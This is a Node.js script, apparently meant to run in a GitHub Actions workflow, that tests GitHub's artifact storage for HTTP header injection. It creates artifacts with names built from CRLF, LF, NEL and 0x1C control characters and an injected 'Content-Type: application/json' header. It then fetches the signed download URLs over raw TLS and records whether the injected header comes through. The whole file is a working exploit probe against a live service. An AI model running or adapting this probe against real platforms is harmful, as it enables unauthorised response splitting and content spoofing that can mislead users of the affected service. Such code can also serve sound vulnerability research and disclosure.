import https from 'node:https';
import tls from 'node:tls';

const artifactEntry = import.meta.resolve('@actions/artifact');
const artifactLib = new URL('.', artifactEntry);
const [{ internalArtifactTwirpClient }, { getBackendIdsFromToken }, { StringValue }] = await Promise.all([
  import(new URL('internal/shared/artifact-twirp-client.js', artifactLib)),
  import(new URL('internal/shared/util.js', artifactLib)),
  import(new URL('generated/index.js', artifactLib)),
]);
const ids = getBackendIdsFromToken();
const client = internalArtifactTwirpClient({ maxAttempts: 1 });

function request(url, options = {}, body = undefined) {
  return new Promise((resolve, reject) => {
    const req = https.request(url, options, response => {
      const chunks = [];
      response.on('data', chunk => chunks.push(chunk));
      response.on('end', () => resolve({ status: response.statusCode, headers: response.headers, rawHeaders: response.rawHeaders, body: Buffer.concat(chunks) }));
    });
    req.on('error', reject);
    if (body) req.write(body);
    req.end();
  });
}

function rawGet(url) {
  return new Promise((resolve, reject) => {
    const target = new URL(url);
    const socket = tls.connect({ host: target.hostname, port: 443, servername: target.hostname });
    const chunks = [];
    socket.on('secureConnect', () => socket.write(Buffer.from([
      `GET ${target.pathname}${target.search} HTTP/1.1`,
      `Host: ${target.host}`,
      'Connection: close',
      '', '',
    ].join('\r\n'), 'ascii')));
    socket.on('data', chunk => chunks.push(chunk));
    socket.on('end', () => resolve(Buffer.concat(chunks)));
    socket.on('error', reject);
  });
}

const candidates = [
  ['crlf-inject-fs', `a"\r\nContent-Type: application/json${String.fromCharCode(0x1c)}\r\nX-X: "b.json`],
  ['lf-inject-fs', `a"\nContent-Type: application/json${String.fromCharCode(0x1c)}\nX-X: "b.json`],
  ['crlf-inject-nel', `a"\r\nContent-Type: application/json\u0085\r\nX-X: "b.json`],
  ['raw-fs', `a${String.fromCharCode(0x1c)}b.json`],
  ['raw-nel', `a\u0085b.json`],
  ['percent-crlf', 'a%0D%0AContent-Type%3A%20application%2Fjson%1C.json'],
];
const results = [];
for (const [label, name] of candidates) {
  try {
    const created = await client.CreateArtifact({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name,
      mimeType: StringValue.create({ value: 'application/octet-stream' }),
      version: 7,
    });
    const uploaded = await request(created.signedUploadUrl, {
      method: 'PUT',
      headers: { 'x-ms-blob-type': 'BlockBlob', 'Content-Type': 'application/octet-stream', 'Content-Length': '2' },
    }, Buffer.from('{}'));
    const finalized = await client.FinalizeArtifact({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name,
      size: '2',
    });
    const rest = await request(
      `https://api.github.com/repos/${process.env.GITHUB_REPOSITORY}/actions/artifacts/${finalized.artifactId}/zip`,
      { headers: { authorization: `Bearer ${process.env.GH_TOKEN}`, accept: 'application/vnd.github+json', 'user-agent': 'repo-cassette-probe' } },
    );
    const location = rest.headers.location || '';
    const raw = location ? await rawGet(location) : Buffer.alloc(0);
    const headerEnd = raw.indexOf(Buffer.from('\r\n\r\n'));
    const headerBytes = headerEnd >= 0 ? raw.subarray(0, headerEnd) : raw.subarray(0, 1000);
    let parsed = null;
    try { parsed = location ? await request(location) : null; } catch (error) { parsed = { error: String(error.message) }; }
    results.push({
      label,
      accepted: true,
      artifactId: finalized.artifactId,
      uploadStatus: uploaded.status,
      rscdHex: location ? Buffer.from(new URL(location).searchParams.get('rscd') || '', 'latin1').toString('hex') : null,
      rawHeaderHex: headerBytes.toString('hex').slice(0, 4000),
      parsedStatus: parsed?.status || null,
      parsedTypeHex: parsed?.headers ? Buffer.from(parsed.headers['content-type'] || '', 'latin1').toString('hex') : null,
      parseError: parsed?.error || null,
    });
  } catch (error) {
    results.push({ label, accepted: false, error: String(error?.message || error).slice(0, 500) });
  }
}

const report = JSON.stringify(results);
console.log(report);
console.log(`::notice title=Artifact name control probe::${report.replaceAll('%', '%25')}`);
